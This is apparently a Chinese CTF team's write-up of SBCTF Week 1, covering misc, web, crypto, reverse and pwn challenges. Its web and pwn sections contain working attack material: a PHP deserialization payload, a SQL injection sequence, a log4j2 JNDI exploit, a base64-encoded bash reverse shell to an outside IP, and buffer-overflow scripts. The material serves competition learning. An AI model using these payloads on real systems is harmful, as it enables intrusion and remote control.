---
title: SBCTF Week1 部分WP
date: 2024-01-21
tags:
  - 技术
excerpt: Spirit x BXS = SB!
slug: 2024-sbctf-w1
---


## Misc

### 1.ez_traffic_analyse

流量分析题，预期大家的做题思路是：1.知道是shadowsocks

2.直接去搜shadowsocks安全问题 3.找到现成的PoC

### 2.ez_leakage

题目附件给了grad和权重，猜测用grad+原来的模型可以还原图像。找了下是DLG，也有现成的脚本（https://github.com/mit-han-lab/dlg

改一下扔到Colab上去跑一次就有了

### 3.evil_pic_encode

确实很邪恶啊...

首先拿到的numpy数组的长度可以用质因数分解分出来，`1801422=2*3*3*7*17*29*29`，分出三个通道，剩下的几个质因数组合一下生成图片发现分辨率为986*609的图片正常（直的）

先看猫脸变换（为什么是这个名字？

写个程序可以发现本题的变换矩阵的循环节为7

```python
def Arnold_period(N):
    # 计算(posx,posy)位置Arnold变换的周期(与整个图像Arnold周期应该一致，待证)
    posx = 28
    posy = 25
    # 变换的初始位置
    x0 = posx
    y0 = posy
    T = 0
    a = 114
    b = 514
    print(T, x0, y0)
    while True:
        x = (x0 + b * y0) % N
        y = (a * x0 + (a * b + 1) * y0) % N
        # x0，y0同时更新
        x0, y0 = x, y
        T += 1
        print(T, x, y)
        if x == posx and y == posy:
            break
    return T
print(Arnold_period(29))
```

于是只需将加密后的图片再变换7次可以找到猫脸变换的矩阵

```python
kk = [
    [5, 1, 4, 2, 3],
    [6, 4, 5, 4, 4],
    [1, 3, 1, 3, 1],
    [5, 3, 3, 2, 5],
    [1, 5, 2, 3, 4],
    [4, 3, 3, 2, 3],
    [6, 5, 2, 6, 4],
    [3, 3, 6, 1, 5],
]
```

接下来就是处理周围的dct块了...发现dct块的加密次数不超过5...但是问题是dct加密后虚部的内容被丢弃了...？似乎需要爆破有点麻烦（

最后发现是碧蓝档案啊（喜

### 4.ez_eval_game

这个题是前几天某个师傅发我做的。觉得还挺有意思就出出来了。

方法很多，不写标准解了。当然如果看到非预期的话我会放上来（x

### 5.bssid

社工题，之前看到过wigle这个网站...，上去查就是san_francisco

### 6.Signin

图片最后有提示（

### 7.strange_pic_encode

可以查到一条曲线可以填充二维平面=>Peano或者是Hilbert曲线。大致观察发现是3x3的块所以是Peano曲线（网上这个东西好少）

搜了一个matlab的实现然后手动改成python

```python

def peano_curve(n):
    peano_old = np.array([[0, 0], [0, 1], [0.5, 1], [0.5, 0], [1, 0], [1, 1]])
    points = peano_old.tolist()
    # points = []
    for i in range(1, n):
        p1 = np.column_stack((peano_old[:, 0], 2 + 1 / (3**i - 1) - peano_old[:, 1]))
        p1 = p1[::-1]
        p2 = np.column_stack((p1[:, 0], 4 + 3 / (3**i - 1) - p1[:, 1]))
        p2 = p2[::-1]
        peano_new = np.vstack((peano_old, p1, p2))
        p1 = np.column_stack((2 + 1 / (3**i - 1) - peano_new[:, 0], peano_new[:, 1]))
        p1 = p1[::-1]
        p2 = np.column_stack((4 + 3 / (3**i - 1) - p1[:, 0], p1[:, 1]))
        p2 = p2[::-1]
        peano_new = np.vstack((peano_new, p1, p2))
        peano_old = peano_new / (3 + 2 / (3**i - 1))
        points = peano_old.tolist()
    points = np.round(np.array(points) * (3**n - 1)).astype(int)
    nP = []
    for i in range(len(points) - 1):
        nP.append(points[i])
        dx = int(points[i + 1][0] - points[i][0])
        dy = int(points[i + 1][1] - points[i][1])
        if dx == 0:
            for j in range(1, abs(dy)):
                nP.append(np.array([points[i][0], points[i][1] + j * (dy // abs(dy))]))
        else:
            for j in range(1, abs(dx)):
                nP.append(np.array([points[i][0] + j * (dx // abs(dx)), points[i][1]]))
    nP.append(points[-1])
    return np.array(nP)

```

然后就卡住了（？不知道是哪种加密的操作方法，导致耗费了一晚上来试怎么做比较好（x

经过一堆尝试发现这样做能够生成差不多形式的图

```python
r = np.array(Image.open("1234.jpg").convert("RGB"))
w, h = r.shape[:2]
points = peano_curve(6)
t = np.zeros_like(r)
r = r.reshape((w * h, 3))
for i in range(len(points)):
    y, x = points[i]
    t[x, w - 1 - y] = r[i]

Image.fromarray(np.array(t).reshape((w, h, 3))).save("crypt1.png")
```

逆向操作即可

```python

r = np.array(Image.open("encrypto.png").convert("RGB"))
w, h = r.shape[:2]
s = []
for i in range(len(points)):
    y, x = points[i]
    s.append(r[x, w - 1 - y])
s.reverse() # 最后发现反了我再返回来即可x
Image.fromarray(np.array(s).reshape((h, w, 3))).save("crypt2.png")
```



## Web

### 1.php_hacker

反序列化构造一个字符串即可。

payload如下

```php
O:8:"Executor":1:{s:7:"command";s:20:"echo `cat /f_l_a_g`;";}
```

中间的shell随便改就行（

### 2.attack_shiro

https://www.cnblogs.com/CoLo/p/14025101.html
找个公网ip弹个shell就行（

### 3.ez_cat

上传一句话木马

然后弹shell提权即可。

用`date -f /flag.txt`读取文件

### 4.ez_sqli

1.字符型注入 

`1' and 1='1`

2.字段数：

`1' order by 1,2,3,4#`不报错

3.当前数据库：

`-1' union select 1,2,3,database()#`

4.当前数据库中的表：

`-1' union select 1,2,3,group_concat(table_name)  from information_schema.tables where table_schema=database() #`

5.secrets表中字段：

`1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’secrets’ #`

6.获取flag

`-1′ or 1=1 union select 1,2,3,group_concat(secret) from secrets #`

### 5.java_signin

奇怪啊...我猜是log4j2 RCE，不知道在哪注入。

于是就只剩下试验了。最开始直接用TCP模拟发HTTP包。失败了

然后发现只用从某几个常用的Headers里试一试就可以了

最后是Accept这个headers里。exp如下：

```python
import requests as r
import base64 as b64
from pwn import pause

ipaddr = "43.128.24.129"
jdni_url = f"rmi://43.128.24.129:1099/063ckb"
# url = "http://47.76.71.50:20009/"
url = "http://localhost:8081"
r.get(url, headers={"Accept": "application/${jndi:" + jdni_url + "}"})

```

然后弹shell的机器上开一个JDNIExplotion和nc监听端口。然后exec`bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMjguMjQuMTI5LzkwMDEgMD4mMQ==|{base64,-d}|{bash,-i}`最后发送请求就可以看到弹来的shell。

## Crypto

### 1.hard_pic_encode

全场最简单好吧

再xor一次即可

### 2.baby_pic_encode

assert可以化简为`x^2 - 810131 y^2 = 1`

查了下是Pell方程

```python

def solvePell(d):
    m = int(np.sqrt(d))
    dq = deque()
    dq.append(m)
    n0 = n1 = d - m * m
    m1 = m
    while 1:
        q, m2 = divmod(m1 + m, n1)
        dq.appendleft(q)
        m1 = -m2 + m
        n1 = (d - m1 * m1) // n1
        if m1 == m and n1 == n0:
            break

    dq.popleft()
    b = 1
    c = 0
    for i in dq:
        b1 = c + b * i
        c = b
        b = b1
    return (b, c)
```

求解得到x,y

用原来的函数在`np.zeros()`上生成一样的补码

然后和加密后的图相减即可。

### 3.SuperBag

本题中观察可知`leak = w`

所以array_2可以求出来

然后就解出来了（x

### 4.Broken PEM

读了pycryptodome的源码，DER格式的内容大概是`[type][length_type][length][content]`，type的内容可以参考[这里](https://learn.microsoft.com/en-us/windows/win32/seccertenroll/about-encoded-tag-bytes)。

因为RSA PEM内容肯定是整数序列，内容如下：

```
      RSAPrivateKey ::= SEQUENCE {
          version           Version,
          modulus           INTEGER,  -- n
          publicExponent    INTEGER,  -- e
          privateExponent   INTEGER,  -- d
          prime1            INTEGER,  -- p
          prime2            INTEGER,  -- q
          exponent1         INTEGER,  -- d mod (p-1)
          exponent2         INTEGER,  -- d mod (q-1)
          coefficient       INTEGER,  -- (inverse of q) mod p
          otherPrimeInfos   OtherPrimeInfos OPTIONAL
      }
```

后面序列有四个数，所以可以得到q，题目也给了e，根据rsa的原理，有
$$
ed \equiv 1 \pmod{\phi(N)}\\
\implies ed \equiv 1 \pmod{\phi(p)\phi(q)}\\
\implies ed \equiv 1 \pmod{\phi(q)}\\
\implies ed \equiv 1 \pmod{q-1}\\
\implies d \equiv  e^{-1} \pmod{q-1}\\
又m\equiv c^d \pmod N
\implies m\equiv c^d \pmod {p\cdot q}\\
\implies m\equiv c^d \pmod q \\
\implies m\equiv c^{e^{-1} \pmod {q-1}} \pmod q
$$
可知，在q已知的情况下能够求出m。

编写exp.py如下

```python
from binascii import a2b_base64, hexlify
from Crypto.Util.number import long_to_bytes as l2b

pem = (
    a2b_base64(
        """
1ixI9xAcwhdVVjzfp55wYLPya5DWWP9zmpMMxYV0Zb74j/r/+ajucrs15/+rG2Rf
BHBMSTFwn4mbL60OfhReOuj3T7cNBYYYHgFGC5kANsa/HVKQegWebJNNAoGBANRg
g8lUzD5t2iE1wrOtzepOCCGNmTeoJckArrsOWBRbJ7U95FJy9pz7beEmH8Upfgjt
ErHXRALLzeKhrKf18nsHg2YsvK5zSD149g+iPhL1JPi/x2BndcYMgBuicMR7eZ59
jDVs72sELL+5tsunUsvu51VHaNi+JwRLHMOe2WgZAoGAKbCaUZR1Dit2zkiIkeg7
WQCdadFnVGoyFOGNlDYLSB4lBE5tqnXfUzQiqTzMnYmynj1VhBaOF3uw4gKWxzkB
aGvDhglVo2LsMrcEMQcv8uqRYZ/50Y4yDcyas1RhsDJ8PrVJOeom7xf5P/GXClIO
mtmiFnna+NzuCdextFZnE+ECgYEAzflBN11XrWCLQtRKHkt9vzWo6ynSpMkexGA2
FtMll7CExWHedBxtk/jCK6/29hh01SFglTyrCG8zIg8dTdTaNHon9UuEP0ktkfkj
5Cu9OlOpZNtS+eu9rLPo92RHLDh4zr8C4bniRg9JezUZ1VBVm9X7ZJkaVcOuQZq7
rfn87tkCgYEAgnKtFAEEOq6UqSgzbYSTPsgpHlQy8ZAzJBZhupevBxXFQyjl6UCD
KSeDSvjgpHngIVEdrpm8xGmHpaYGhdvUBX3RmFv5wg/Lhb5Y/aMu3Tpv2hhysmv1
thD5ts5oRIwKrl0ZlrQPybnYLHMixky5R9JJohRv8Dmgp15afJ4PEHc=
-----END RSA PRIVATE KEY-----
""".replace(
            "-----END RSA PRIVATE KEY-----", ""
        ).replace(
            "\n", ""
        )
    )
    .hex()
    .split("0281") #02表示下面的type是整数 81表示接下来一位是长度
)[1:] #第一块是无用块。
pem = [int(i[2:], 16) for i in pem] #去掉长度标识转成整数。
q = pem[0]
e = 0x10001
d = pow(e, -1, q - 1)
c = int(
    """64cf9253ce6f8bb37ad43cbb473a0577d036144d5dc9ce0ae2fa5a485950096b0b78b06f06bcc60b6f92eddc34ff1ea1e1573b82912c4aea70c645bf11c9bf36a291ff9793390051e412ab209eb199cf0ea0c100e4c7af7a650848c14ec44b7d78a13da503a30eb8ef37e432bcd587bc7cebfc4d89aaaf4b8f3f84c5947a623375008a8d211e97057923c115e320ccaf9cb9f839a0c03c8d337b061ca58c8ccf9d3fdbb121fce009b313ee7381a124b80ff9f1ed0217cca2cf58306e9a99baa7aafcfab90164ab45fd37f240a584c5631a5325249b371551c8daaab8882cd01b439b383d7c557534a99e7af5e64afdf6d22d0fb6f67944996aa874150b9deffb""",
    16,
)
m = pow(c, d, q)
print(l2b(m).decode())
```

### 5.A Bit Limit

由于给了q的高位，这个题大概是用coppersmith_attack来分解。

但是如果直接用q分解，界没设好的话最后得到的解是-q

所以需要将q补全几位再继续分解。

## Reverse

### 1.Baby Math

一个形式为Ax=B的方程。解出来即可

### 2.simple

注意到代码中出现了`2654435769 = -1640531527 & 0xFFFFFFFF  = 0x9E3779B9 `常用于tea加密。

于是写了一个解密程序。得到flag。

### 3.babysmc

查壳是UPX壳。但是似乎有改动所以无法直接脱壳，于是用https://www.anquanke.com/post/id/272639的方法手动脱壳了。然后丢进IDA找到了主函数

![image-20240118150829178](https://cdn.nvme0n1p.dev/picstorage/2024-01-18-24/01-18150836.png)

![image-20240118152038279](https://cdn.nvme0n1p.dev/picstorage/2024-01-18-24/01-18152038.png)

点开主函数发现还有东西...？用sub_4014C8()解密了sub_401410这个函数，然后再进行了比较。

然后再丢进x32dbg动态调试定位到call 401410前设置断点。然后就可以看到解密之后的函数指令。

当然看指令什么的还是算了，同样dump出来丢进ida就是原函数

![666fefd52fee6e48665161b445792679](https://cdn.nvme0n1p.dev/picstorage/2024-01-18-24/01-18154949.png)



稍微模拟一下就可以找到原内容。

## Pwn

### 1.Rise_of_the_Dragon_Slayer

直接写就行（，唯一要注意的是加一个int，除法是整数。

```python
from pwn import *
import ctypes

# context.log_level = "debug"
p = connect("47.76.71.50", 20009)
from re import compile

calc = compile(r"(\d+) ([\+\-\*\/]) (\d+) =")
p.recvuntil(b"Now, you need to answer 20 questions to test your intelligence.\n")
for i in range(20):
    print(i)
    res = p.recvuntil(b"Please input your answer:\n").decode().replace(b"\n", b"")
    a, op, b = calc.findall(res)[0]
    p.sendline(str(eval(f"int({a + op + b})")).encode())
for i in range(20):
    print(i)
    res = p.recvuntil(b"Input the position you want to attack:\n").decode().split("\n")
    for i in res:
        if "M" in i:
            p.sendline(str(i.split("M")[0].__len__()).encode())
p.interactive()
```

### 2.ez_pwn1

来自唐老师的宝宝题（（

当然我也是宝宝所以问了唐老师很久（x

```python
from pwn import *

context.log_level = "debug"
# p = process("./1")
r = ELF("./1")
target = r.sym["backdoor"]
p = connect("47.76.71.50", 20009)
payload = b"a" * (0x10 + 0x8) + p64(target + 0x8)
# gdb.attach(p)
pause()
p.sendline(payload)
print("[+] Payload sent")
p.interactive()

```

### 3.Journey_of_the_Chosen

emm就竞争利用。（高级一点叫TOCTOU攻击）

大概思路就是在gift的sleep间断中调用buy然后继续调用gift。从而维持增加的状态。

exp如下：

```python
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

p = remote("47.76.71.50", 20009)
# p = process("./pwn")
# gdb.attach(p)
payload = b""
endl = b"\n"
p.send("1\n2\n1\n2\n1\n3\n")
# print(res.decode())
p.interactive()
```

### 4.Legacy_of_the_Conqueror

大概是![image-20240118233610870](https://cdn.nvme0n1p.dev/picstorage/2024-01-18-24/01-18233610.png)

这个地方用input->v1修改v2的值。卡住了。明天再来

